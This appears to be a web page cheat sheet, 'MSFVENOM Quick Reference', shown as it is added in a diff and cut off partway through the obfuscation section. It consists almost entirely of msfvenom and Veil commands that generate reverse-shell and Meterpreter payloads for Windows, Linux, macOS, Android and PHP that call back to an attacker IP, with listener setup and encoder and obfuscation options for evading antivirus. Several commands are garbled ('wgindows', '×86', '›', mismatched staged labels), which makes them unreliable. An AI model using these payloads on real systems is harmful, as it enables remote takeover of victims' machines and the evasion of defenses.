@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MSFVENOM Quick Reference - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "MSFVENOM Quick Reference", url: "#_top", children: [
+              {title: "1. Basics", url: "#1-basics" },
+              {title: "2. Target OS", url: "#2-target-os" },
+              {title: "3. With Veil Framerwork", url: "#3-with-veil-framerwork" },
+              {title: "4. Staged \u0026amp; Non-Staged by OS", url: "#4-staged-non-staged-by-os" },
+              {title: "5. Obfuscated and encoded", url: "#5-obfuscated-and-encoded" },
+              {title: "6. Other possible evasion detection payloads", url: "#6-other-possible-evasion-detection-payloads" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="msfvenom-quick-reference">MSFVENOM Quick Reference</h1>
+<hr />
+<p><strong>More Cheatsheets</strong></p>
+<ul>
+<li><a href="https://github.com/frizb/MSF-Venom-Cheatsheet">@frizb</a></li>
+<li><a href="https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/">@nitesculucian</a></li>
+<li><a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">Infinite Logins</a></li>
+</ul>
+<hr />
+<h3 id="1-basics">1. Basics</h3>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># List all encoders</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>msfvenom<span class="w"> </span>--list<span class="w"> </span>encoders
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># List all payloads</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>msfvenom<span class="w"> </span>--list<span class="w"> </span>payloads
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># Encoded Meterpreter reverse TCP payload for Windows </span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>›<span class="w"> </span>encodedevil.exe
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># Meterpreter reverse TCP payload for Linux </span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/×86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>›<span class="w"> </span>reverse.elf
+</span></code></pre></div>
+<strong><em>Catching the shell</em></strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Start Win Meterpreter Listener</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>msfconsole
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>use<span class="w"> </span>multi/handler
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>run
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>-<span class="w"> </span>credit<span class="w"> </span>netmux
+</span></code></pre></div></p>
+<h3 id="2-target-os">2. Target OS</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>MSFVENOM<span class="w"> </span>Payloads
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># Windows Reverse TCP Meterpreter</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>reverse_meterpreter.exe
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># Linux Reverse TCP Meterpreter</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse_meterpreter.elf
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># macOS Reverse TCP Meterpreter</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>osx/x86/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>macho<span class="w"> </span>-o<span class="w"> </span>reverse_shell.macho
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="c1"># Android Reverse TCP Meterpreter</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>android/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-o<span class="w"> </span>reverse_meterpreter.apk
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1"># PHP Reverse TCP Meterpreter</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>-o<span class="w"> </span>reverse_shell.php
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="c1"># Generate a Windows x86 reverse shell payload in the Powershell format</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>powershell<span class="w"> </span>-o<span class="w"> </span>reverse_shell.ps1
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="c1"># Generate a Linux x86 bind shell payload in the Python format</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/shell/bind_tcp<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>python<span class="w"> </span>-o<span class="w"> </span>bind_shell.py
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="c1"># Generate a macOS x86 reverse TCP Meterpreter payload that connects through an HTTP proxy</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>osx/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>macho<span class="w"> </span>-o<span class="w"> </span>reverse_meterpreter.macho<span class="w"> </span><span class="nv">HTTP_PROXY</span><span class="o">=</span>http://proxy.example.com:8080
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="c1"># Generate a Windows x64 reverse HTTPS Meterpreter payload that encrypts communications with RC4</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_https<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;attacker<span class="w"> </span>port&gt;<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>reverse_meterpreter.exe<span class="w"> </span><span class="nv">ENCODING</span><span class="o">=</span>rc4
+</span></code></pre></div>
+<h3 id="3-with-veil-framerwork">3. With Veil Framerwork</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Veil Framework &#39;apt install veil&#39;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>PYTHON
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Generate a custom payload with a specific name and set of evasion techniques</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>python<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>python/meterpreter/rev_http<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;-e x86/shikata_ga_nai -o raw -H 5&#39;</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1"># Generate a payload with a custom shellcode encoder</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>python<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>python/meterpreter/rev_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;-x alpha_mixed&#39;</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="c1"># Generate a payload with custom obfuscation options</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>python<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>python/meterpreter/reverse_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;-t PS -Obfuscate true -ObfuscationType 3 -OutDirectory /root/veil/payloads/obfuscated&#39;</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>WIN<span class="w"> </span>CMD
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="c1"># Generate a payload with an encrypted communication channel</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>python<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>python/meterpreter/rev_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;-e x86/shikata_ga_nai -o raw -C &lt;attacker IP&gt;:&lt;attacker port&gt;&#39;</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="c1">#Generate a windows payload with a custom shellcode encoder</span>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>python.exe<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>exe<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;-e x86/shikata_ga_nai -o raw -H 5&quot;</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="c1"># Generate a windows payload with custom obfuscation options</span>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>python.exe<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>exe<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;-x alpha_mixed&quot;</span>
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="c1"># Generate a windows payload with an encrypted communication channel</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>python.exe<span class="w"> </span>Veil.py<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-o<span class="w"> </span>my_payload<span class="w"> </span>-t<span class="w"> </span>exe<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;-e x86/shikata_ga_nai -o raw -C &lt;attacker IP&gt;:&lt;attacker port&gt;&quot;</span>
+</span></code></pre></div>
+<h3 id="4-staged-non-staged-by-os">4. Staged &amp; Non-Staged by OS</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Windows x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Windows x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># Windows x64 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>wgindows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1"># Windows x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c1"># Linux x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c1"># Linux x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="c1"># Linux x64 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="c1"># Linux x64 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>--platform<span class="w"> </span>linux<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>reverse.elf<span class="sb">`</span>
+</span></code></pre></div>
+<h3 id="5-obfuscated-and-encoded">5. Obfuscated and encoded</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Windows x86 Non-Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/call4_dword_xor<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Windows x86 Staged Meterpreter Reverse TCP</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="sb">`</span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP_ADDRESS&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>--smallest<span class="w"> </span>-o<span class="w"> </span>encodedevil.exe<span class="sb">`</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Windows x64 Non-Staged Meterpreter Reverse TCP</span>
